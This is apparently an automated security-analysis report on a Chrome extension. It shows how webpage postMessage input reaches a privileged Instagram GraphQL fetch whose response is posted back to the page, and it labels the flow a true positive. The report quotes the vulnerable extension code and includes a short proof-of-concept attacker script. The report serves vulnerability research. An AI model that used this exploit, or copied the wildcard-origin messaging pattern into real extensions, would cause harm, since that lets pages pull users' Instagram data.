# CoCo Analysis: eeoldmgdbmdkhbbaodaijappecbnehpb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (both related to same vulnerability)

---

## Sink 1: cs_window_eventListener_message → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eeoldmgdbmdkhbbaodaijappecbnehpb/opgen_generated_files/cs_0.js
Line 467: `window.addEventListener("message", function (event) {`
Line 469: `chrome.runtime.sendMessage({ payload: event.data.payload }, function(resp) {`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eeoldmgdbmdkhbbaodaijappecbnehpb/opgen_generated_files/bg.js
Line 971: `fetch(url + encodeURIComponent(JSON.stringify(request.payload)))`

**Code:**

```javascript
// Content script (cs_0.js) - Entry point
window.addEventListener("message", function (event) {
    if (event.data.type == "page") {
        chrome.runtime.sendMessage({ payload: event.data.payload }, function(resp) { // ← attacker-controlled payload
            window.postMessage(resp, "*") // ← Response sent back to attacker
        });
    }
}, false);

// Background script (bg.js) - Message handler
chrome.runtime.onMessage.addListener(
    function (request, sender, sendResponse) {
        var url = "https://www.instagram.com/graphql/query/?query_hash=bc3296d1ce80a24b1b6e40b1e72903f5&variables=";

        fetch(url + encodeURIComponent(JSON.stringify(request.payload))) // ← Privileged SSRF
            .then(result => result.json())
            .then(response => {
                sendResponse({ type: "extension", response }); // ← Response sent back
            });

       return true;
    }
);

// manifest.json permissions:
// "host_permissions": ["https://*.instagram.com/*"]
// "content_scripts": matches: ["http://localhost:8000/*", "https://drawitt.com/*", "https://www.drawitt.com/*"]
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage from webpage to content script

**Attack:**

```javascript
// From attacker-controlled webpage (e.g., https://drawitt.com/malicious.html)
window.postMessage({
    type: "page",
    payload: {
        // Arbitrary Instagram GraphQL query parameters
        user_id: "123456789",
        first: 100
    }
}, "*");

// Listen for response
window.addEventListener("message", function(event) {
    if (event.data.type === "extension") {
        console.log("Instagram API response:", event.data.response);
        // Attacker receives privileged Instagram API data
    }
});
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability. An attacker on drawitt.com can abuse the extension's privileged host_permissions to Instagram to make arbitrary GraphQL API requests to Instagram and receive the responses. This allows the attacker to query Instagram's private API endpoints using the extension as a proxy, potentially accessing data that would normally require authentication or be rate-limited. The attacker can extract user data, follower lists, comments, and other information from Instagram's GraphQL API through the extension's privileged access.

---

## Sink 2: fetch_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/eeoldmgdbmdkhbbaodaijappecbnehpb/opgen_generated_files/bg.js
Line 265: `var responseText = 'data_from_fetch';`

**Note:** This is the same vulnerability as Sink 1, just showing the reverse flow where fetch response data flows back to the webpage via window.postMessage. This completes the SSRF exploitation chain by returning the Instagram API response to the attacker.

**Classification:** TRUE POSITIVE

This sink demonstrates that the data from the privileged fetch request successfully flows back to the attacker, making the SSRF fully exploitable.
